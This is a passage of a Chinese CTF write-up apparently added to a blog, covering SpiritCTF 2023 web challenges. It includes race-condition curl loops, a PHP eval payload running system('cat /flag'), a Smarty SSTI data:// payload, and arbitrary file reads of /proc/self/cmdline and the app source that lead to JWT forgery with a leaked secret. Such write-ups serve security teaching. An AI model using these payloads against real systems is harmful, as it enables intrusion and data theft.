+<p>如果余额不足再 <code>_Wallet += flagPrice</code></p>
+<p>考虑到两个互斥锁仅控制了单<span class="hexo-wm">s‍3𝒗ℯ𝐧．​sⅈ‍𝘵𝘦‍</span>个函数不能被同时多次调用</p>
+<p>并没有控制两个<span class="hexo-wm">𝘴​​³ⅴen．‌ѕⅈ​﻿ｔｅ​</span>函数的同时运行</p>
+<p>且由于两个函数都访问了 <code>_FlagPrice</code> 和 <code>_Wallet</code></p>
+<p>因此存在竞态条件的可能</p>
+<blockquote>
+<p>假设 action <code>CutDown</code> 中的 <code>_FlagPrice -= (_FlagPrice - _Wallet) / 2;</code><br>在 action <code>Buy</code> 的 <code>_Wallet -= flagPrice</code> 和 <code>_Wallet += flagPrice</code>之间发生，<br>就可以使得 <code>_FlagPrice</code> 降低到 <code>_Wallet</code> 以下，从而得以购买 <code>flag</code></p>
+</blockquote>
+<h2 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h2><p>构造两个发包脚本<span class="hexo-wm">𝘀‌3𝘷ｅn․‌​ꜱⅈ‌𝘵℮‍</span>并同时运行即可</p>
+<p>注意携带当前会话的 <code>sessionId</code> Cookies</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token keyword">while</span> <span class="token boolean">true</span>
+<span class="token keyword">do</span>
+<span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=buy"</span>
+<span class="token keyword">done</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token keyword">while</span> <span class="token boolean">true</span>
+<span class="token keyword">do</span>
+<span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"sessionId=xxxx"</span> <span class="token string">"(SpiritCTF Server URL with port)/?action=cutDown"</span>
+<span class="token keyword">done</span></code></pre>
+
+<p>同时运行两个脚本一段<span class="hexo-wm">ꜱ‌3v𝘦𝒏·‍𝒔𝘪‌𝐭𝐞﻿​</span>时间后会发现 <code>Flag价格</code> 和 <code>钱包</code> 都变成了0</p>
+<p>因此得以购买成功</p>
+<p><img src="image-32.png" alt="image-32.png"></p>
+<p>得到 <code>flag</code> 如下</p>
+<blockquote>
+<p>Spirit{61a9950d-<span class="hexo-wm">𝘀‍‌³𝒗ｅ𝐧.‌﻿ꜱｉ‍𝘵℮​</span>0e0a-4141-<span class="hexo-wm">𝘴‌³𝘷e𝘯．​​ꜱ𝐢‍​𝘵℮​</span>b04d-278961a87df0}</p>
+</blockquote>
+<h1 id="送分你要不要"><a href="#送分你要不要" class="headerlink" title="送分你要不要>_<"></a>送分你要不要&gt;_&lt;</h1><p>题目描述：</p>
+<blockquote>
+<p>这是一道没有意<span class="hexo-wm">𝐬​3𝒗eｎ∙​<span class="hexo-wm">𝐬‍𝟯𝒗𝐞𝐧.﻿𝒔i﻿﻿ｔe‌</span>𝘴𝘪​𝐭e‌</span>思的签到题😠</p>
+</blockquote>
+<p>打开页面后得到<span class="hexo-wm">𝒔﻿‍⑶𝐯ｅｎ•‌𝘀ⅈ﻿𝘵𝘦‍</span>PHP代码如下：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// ‮⁦ Spirit⁩⁦Welcome to</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"App1eTree"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'spirit'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token string double-quoted-string">"‮⁦Flag!⁩⁦SpiritCTF"</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span>‮⁦give_you⁩⁦<span class="token number">2023</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QWQ'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"恭喜!flag送你啦"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Welcome to Spirit CTF 2023(but warm)!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script src="nonono.js"&gt;&lt;/script&gt;'</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span></code></pre>
+<h2 id="1-不可见字符识别"><a href="#1-不可见字符识别" class="headerlink" title="1. 不可见字符识别"></a>1. 不可见字符识别</h2><p>根据该段代码神奇的高亮，<span class="hexo-wm">𝘴‍﻿⑶𝒗𝐞𝘯·‍‍sｉ﻿𝘵𝘦﻿</span>判断此处存在不可见字符</p>
+<p>这些不可见字符调整<span class="hexo-wm">𝐬‍³𝐯𝐞n．﻿‍sｉ‌﻿te‍​</span>了可见字符的显示顺序</p>
+<p>将代码复制到 <code>Visual Stuidio Code</code> 中分析</p>
+<p><img src="image-33.png" alt="image-33.png"></p>
+<p>可以看到不可见字<span class="hexo-wm">ꜱ﻿﻿3ⅴ𝐞𝐧．﻿ѕ𝐢‌ｔ℮​</span>符被显示了出来</p>
+<h2 id="2-eval-利用"><a href="#2-eval-利用" class="headerlink" title="2. eval 利用"></a>2. eval 利用</h2><p>注意到该PHP代码使用了eval($_POST[‘QWQ’]);</p>
+<p>因此想到可以通过 <code>eval</code> 函数来执行 <code>system</code> 命令 <code>cat</code> 出 <code>flag</code></p>
+<h2 id="3-Payload-构造"><a href="#3-Payload-构造" class="headerlink" title="3. Payload 构造"></a>3. Payload 构造</h2><p>根据题目要求构造PO<span class="hexo-wm">𝘀​⑶𝒗𝘦𝘯·﻿‌ѕi‌𝘵𝐞‌​</span>ST数据包如下：</p>
+<p><img src="image-34.png" alt="image-34.png"></p>
+<h3 id="3-1-Python-requests-POST"><a href="#3-1-Python-requests-POST" class="headerlink" title="3.1 Python requests POST"></a>3.1 Python requests POST</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"(SpiritCTF Server URL with port)"</span>
+<span class="token keyword">global</span> result
+data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"spirit"</span><span class="token punctuation">:</span><span class="token string">"App1eTree"</span><span class="token punctuation">,</span><span class="token string">"‮⁦give_you⁩⁦2023"</span><span class="token punctuation">:</span><span class="token string">"‮⁦Flag!⁩⁦SpiritCTF"</span><span class="token punctuation">,</span><span class="token string">"QWQ"</span><span class="token punctuation">:</span><span class="token string">'system("cat /flag");'</span><span class="token punctuation">}</span>
+html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
+
+<p>发送POST数据包后，<span class="hexo-wm">𝐬​⑶𝒗𝘦n∙​ѕ𝘪‌𝐭𝐞‍</span>返回如下信息：</p>
+<pre class="language-none"><code class="language-none">&lt;code&gt;&lt;span style="color: #000000"&gt;
+&lt;span style="color: #0000BB"&gt;&lt;?php&lt;br /&gt;error_reporting&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;0&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;show_source&lt;/span&gt;&lt;span style="color: #007700"&gt;(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;__FILE__&lt;/span&gt;&lt;span style="color: #007700"&gt;);&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&nbsp;‮⁦&nbsp;Sp
+irit⁩⁦Welcome&nbsp;to&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #007700"&gt;if&nbsp;(&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"App1eTree"&nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;==&nbsp;&lt;/span&gt;&lt;span style="color: #0000
+BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'spirit'&lt;/span&gt;&lt;span style="color: #007700"&gt;]&nbsp;&amp;&amp;&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"‮⁦Flag!⁩⁦Spiri
+tCTF"&nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;==&nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #0000BB"&gt;‮⁦give_you⁩⁦2023&lt;/span&gt;&lt;span st
+yle="color: #007700"&gt;])&nbsp;{&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;eval(&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_POST&lt;/span&gt;&lt;span style="color: #007700"&gt;[&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'QWQ'&lt;/span&gt;&lt;span style="color: #007700"&gt;]);&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"恭喜!flag送你啦"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;}else&nbsp;{&lt;br /&gt;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;"Welcome&nbsp;to&nbsp;Spirit&nbsp;CTF&nbsp;2023(but&nbsp;warm)!"&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;echo&nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'&lt;script&nbsp;src="nonono.js"&gt;&lt;/script&gt;'&lt;/span&gt;&lt;span style="color: #007700"&gt;;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;?&gt;&lt;/span&gt;
+&lt;/span&gt;
+&lt;/code&gt;Spirit{00e6fceb-debc-4aa6-a721-489f4da2e7f0}
+恭喜!flag送你啦&lt;script src="nonono.js"&gt;&lt;/script&gt;</code></pre>
+<p>得到 <code>flag</code> 如下:</p>
+<blockquote>
+<p>Spirit{00e<span class="hexo-wm">ꜱ‌⑶𝐯𝘦𝐧∙‌𝐬ｉ​𝒕℮​‍</span>6fceb-debc-<span class="hexo-wm">ꜱ﻿‍⑶ⅴℯｎ∙﻿ꜱ𝐢‌ｔ𝐞‌</span>4aa6-a721-489f4da2e7f0}</p>
+</blockquote>
+<h1 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h1><p>题目描述：</p>
+<blockquote>
+<p>R U SMART <span class="hexo-wm">ꜱ﻿​3𝘷ｅ𝐧．‍sｉ﻿𝒕e﻿</span>ENOUGH www</p>
+</blockquote>
+<p>打开页面后发现有很多题目</p>
+<p><img src="image-35.png" alt="image-35.png"></p>
+<p>结合题目标题 <code>ssti</code> 和 题目描述 <code>SMART</code></p>
+<p>可以判断出该题为 <code>Smarty的SSTI模版注入</code></p>
+<p><del>是谁做完了所有题目才发现是 <span class="hexo-wm">ѕ‍3ⅴ𝘦n.‍‌𝘀𝘪‌‍𝘵𝘦‍‌</span>SSTI 我不说</del></p>
+<p>随意点击一个 <code>challenge</code> ，发现页面跳转到了 <code>/challenges.php?name=xxxx</code> ,</p>
+<p>由此判断后端会使用文件读取函数读取名字为 <code>xxxx</code> 的模版文件并渲染到前端</p>
+<p>利用 <code>data</code> 伪协议构造 <code>payload</code> 如下：</p>
+<pre class="language-none"><code class="language-none">/challenges.php?name=data://text/plain,{$smarty.env.FLAG}</code></pre>
+
+<p>即可将 <code>smarty</code> 的环境变量 <code>FLAG</code> 显示到前端</p>
+<p><img src="image-36.png" alt="image-36.png"></p>
+<p>得到 <code>flag</code> 如下：</p>
+<pre class="language-none"><code class="language-none">Spirit{f94322ca-2c8f-4dc3-87f4-ec75d4c7bbbc}</code></pre>
+
+<h1 id="你喜欢鸣濑白羽吗"><a href="#你喜欢鸣濑白羽吗" class="headerlink" title="你喜欢鸣濑白羽吗"></a>你喜欢鸣濑白羽吗</h1><p>题目描述：</p>
+<blockquote>
+<p>不喜欢鸣濑白羽(?<span class="hexo-wm">𝐬‍‍³𝐯ℯ𝒏∙‌s𝐢‌﻿𝘵℮﻿</span>)的是不能拿到flag的😘 <del>最好用火狐浏览<span class="hexo-wm">𝒔​‍⑶veｎ.​𝘀i​te‌﻿</span>器打开抓包，用bp</del> (已经恢复了)</p>
+</blockquote>
+<p>打开页面后发现是<span class="hexo-wm">𝘀​‌⑶𝘷𝘦ｎ．​‍𝒔𝘪﻿𝒕℮​</span>一个图库管理下载系统</p>
+<p><img src="image-37.png" alt="image-37.png"></p>
+<h2 id="1-任意文件读取漏洞"><a href="#1-任意文件读取漏洞" class="headerlink" title="1. 任意文件读取漏洞"></a>1. 任意文件读取漏洞</h2><p>点击 <code>Download</code> 按钮，发现页<span class="hexo-wm">𝘴﻿​𝟯𝒗e𝘯•‍𝐬𝐢‍‍𝘵℮﻿﻿</span>面跳转到了 <code>/download?filename=xxxx</code></p>
+<p>经过测试发现 <code>filename</code> 字段存在任意<span class="hexo-wm">𝒔‌3𝐯𝐞𝒏․‍sｉ​ｔ𝘦​</span>文件读取漏洞</p>
+<p>访问 <code>/download?filename=/proc/self/cmdline</code> ，内容如下：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">python /app/Nanami.py</code></pre>
+<p>根据服务端代码路径访问 <code>/download?filename=/app/Nanami.py</code>,</p>
+<p>得到服务端代码如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mimetypes
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template
+<span class="token keyword">import</span> jwt
+<span class="token keyword">import</span> logging
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+SECRET_KEY <span class="token operator">=</span> <span class="token string">"I_LIKE_Aoyama_Nanami"</span>
+logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'error.log'</span><span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> token<span class="token punctuation">:</span>
+        token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'guest'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+    
+    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> samesite<span class="token operator">=</span><span class="token string">'Lax'</span><span class="token punctuation">)</span>  
+
+    <span class="token keyword">return</span> response
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> SECRET_KEY<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+
+    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'1.jpg'</span><span class="token punctuation">)</span>
+    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'static/images'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> filename <span class="token operator">==</span> <span class="token string">"yuanshen?qidong!"</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/readflag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Error executing /readflag: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        mime_type<span class="token punctuation">,</span> encoding <span class="token operator">=</span> mimetypes<span class="token punctuation">.</span>guess_type<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> mime_type <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            mime_type <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span>
+        
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> mime_type<span class="token punctuation">)</span>
+            response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'attachment; filename=</span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> response
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"File not found."</span><span class="token punctuation">,</span> <span class="token number">404</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">internal_server_error</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>logger<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Server Error: %s'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">"好像有什么错误喵!"</span><span class="token punctuation">,</span> <span class="token number">500</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+</code></pre>
+<p>分析代码后发现只有满<span class="hexo-wm">ꜱ​³𝐯e𝘯․‍‌s𝐢﻿ｔ𝐞‍‌</span>足以下两个条件才能调用 <code>/readflag</code> subprocess 来读取flag：</p>
+<ul>
+<li>Cookies <code>auth</code> 经过 jwt<span class="hexo-wm">𝘀‍​3𝘷eｎ·﻿﻿𝘀ｉ‍𝐭℮‌</span> 解析后包含 <code>{"username":"admin"}</code> 字段</li>
+<li>filename 的 <span class="hexo-wm">𝒔​‌3𝘷𝐞n．﻿𝐬ⅈ‌𝒕𝘦​</span>GET 传参为 <code>yuanshen?qidong!</code></li>
+</ul>
+<h2 id="2-JWT-Json-Web-Tokens"><a href="#2-JWT-Json-Web-Tokens" class="headerlink" title="2. JWT (Json Web Tokens)"></a>2. JWT (Json Web Tokens)</h2><p>从 F12 开发人员工具中找到当前 <span class="hexo-wm">𝒔‍3𝘷𝐞𝘯․﻿​ꜱｉ‌​t℮‌​</span>Cookies <code>auth</code> 的值</p>
+<p><img src="image-38.png" alt="image-38.png"></p>
+<pre class="language-none"><code class="language-none">auth = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.6tqEhsR0SEHG-GL7hEar5Ewi2dQbGSEz-3NoPrZxi1Y</code></pre>
+
+<h3 id="2-1-JWT-的组成"><a href="#2-1-JWT-的组成" class="headerlink" title="2.1 JWT 的组成"></a>2.1 JWT 的组成</h3><p><img src="image-39.png" alt="image-39.png"></p>
+<p>JWT 通常是一个很长的字<span class="hexo-wm">𝘀‍𝟯𝒗ｅｎ·‍​ꜱ𝐢﻿‍𝐭𝐞‍</span>符串，中间用两个 <code>.</code> 分隔成三个部分，依次为：</p>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（负载）</li>
+<li>Signatu<span class="hexo-wm">𝒔﻿﻿³ⅴ𝐞𝘯․﻿𝘀𝐢​𝐭𝘦​</span>re（签名）</li>
+</ul>
+<p>该字符串应形如：Header.Payload.<span class="hexo-wm">ꜱ﻿‌3vｅn․‌‍s𝘪﻿𝐭ｅ​​</span>Signature</p>
+<p>下面将分别解释三个部分<span class="hexo-wm">𝒔‌³ⅴe𝘯․​﻿𝘴ⅈ‍te‌</span>的内容及其作用：</p>
+<h4 id="2-1-1-Header"><a href="#2-1-1-Header" class="headerlink" title="2.1.1 Header"></a>2.1.1 Header</h4><p>Header 部分是一个 JSON 对象，用于描述 JWT <span class="hexo-wm">𝐬‌⑶ⅴ𝘦𝐧．﻿‍ꜱ𝐢‍‌𝐭ｅ﻿‍</span>的元数据，它通常是这样的：</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
+  <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
+  <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>
+<span class="token punctuation">}</span></code></pre>
+<p>其中：</p>
+<ul>
+<li><p><code>alg</code> 属性表示 <code>Signature</code> 的加密算法，默认是 <code>HMAC SHA256</code> （写成 <code>HS256</code> ）</p>
+</li>
+<li><p><code>typ</code> 属性表示 <code>token</code> 的类型，<code>JWT</code> 类型统一写为 <code>JWT</code></p>
+</li>
+</ul>
+<p>最后，将上面的 JSON 对象使用 <code>Base64URL</code> 算法（详见后文<span class="hexo-wm">𝘀​³ve𝒏.​𝒔𝐢​𝘵℮‍</span>）转成字符串</p>
+<h4 id="2-1-2-Payload"><a href="#2-1-2-Payload" class="headerlink" title="2.1.2 Payload"></a>2.1.2 Payload</h4><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据</p>
+<p>由于该部分可以通过 <code>Base64URL</code> 进行解密并被读取，<span class="hexo-wm">𝘴​³v𝐞𝒏.​‌s𝘪‍ｔ𝘦​‌</span>此处一般不存放密文</p>
+<p>这个 JSON 对象最后也要使用 <code>Base64URL</code> 算法（详见后<span class="hexo-wm">𝐬​‌𝟯𝘷𝘦𝒏·‍𝒔𝘪‌ｔe‌‍</span>文）转成字符串</p>
+<h4 id="2-1-3-Signature"><a href="#2-1-3-Signature" class="headerlink" title="2.1.3 Signature"></a>2.1.3 Signature</h4><p>Signature 部分是对前两部分的签名，<span class="hexo-wm">𝒔​﻿𝟯𝒗𝐞𝘯.‍‍ѕⅈ﻿𝘵𝐞﻿</span>防止数据在传输过程中被篡改</p>
+<p>签名由 Header 里面指定的签名算法（默认是 <code>HMAC SHA256</code> ）和 设置好的密钥（ <code>secret_key</code> ）产生：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">HMACSHA256</span><span class="token punctuation">(</span><span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span></code></pre>
+
+<p>最后，把 Header、<span class="hexo-wm">𝒔​⑶𝒗𝐞𝒏∙​‌s𝘪‌t𝐞​‍</span>Payload、Signature 三个部分拼成一个字符串，</p>
+<p>每个部分之间用 <code>.</code> 分隔，就形成了一个有效的 JSON <span class="hexo-wm">ѕ​‍³v𝐞𝐧∙‍𝐬i​‍𝐭℮​</span>Web Token</p>
+<h4 id="2-1-4-Base64URL"><a href="#2-1-4-Base64URL" class="headerlink" title="2.1.4 Base64URL"></a>2.1.4 Base64URL</h4><p>前面提到，将 Header <span class="hexo-wm">𝐬‍​³𝘷eｎ·‍𝐬ⅈ﻿𝒕ｅ‍​</span>和 Payload 串型化的算法是 <code>Base64URL</code>，</p>
+<p>该算法跟 <code>Base64</code> 算法基本类似，但有一些不同：</p>
+<ul>
+<li>省略通过 <code>Base64</code> 算法得到的 <code>=</code> </li>
+<li>将通过 <code>Base64</code> 算法得到的 <code>+</code> 替换成 <code>-</code> ，<code>/</code> 替换成 <code>_</code></li>
+</ul>
+<p>这是因为 JWT 作为一个 <code>token</code> ，有时会被应用于 <span class="hexo-wm">𝘴‍3𝐯ｅ𝘯．﻿﻿sⅈ​𝒕𝐞​​</span>URL 中（例如 <code>/?token=xxx</code>）,</p>
+<p>通过 <code>Base64</code> 算法得到的三<span class="hexo-wm">𝘀​⑶𝒗𝘦n.​​𝘀𝘪‍𝐭e‍​</span>个字符 ( <code>+</code> 、 <code>/</code> 、 <code>=</code> ) ，在 URL 里面有特殊含义，所以需要进行省略或替换</p>
+<h3 id="2-2-JWT的伪造"><a href="#2-2-JWT的伪造" class="headerlink" title="2.2 JWT的伪造"></a>2.2 JWT的伪造</h3><p>使用 <a href="https://jwt.io/">jwt.io</a> 解析</p>
+<p><img src="image-40.png" alt="image-40.png"></p>
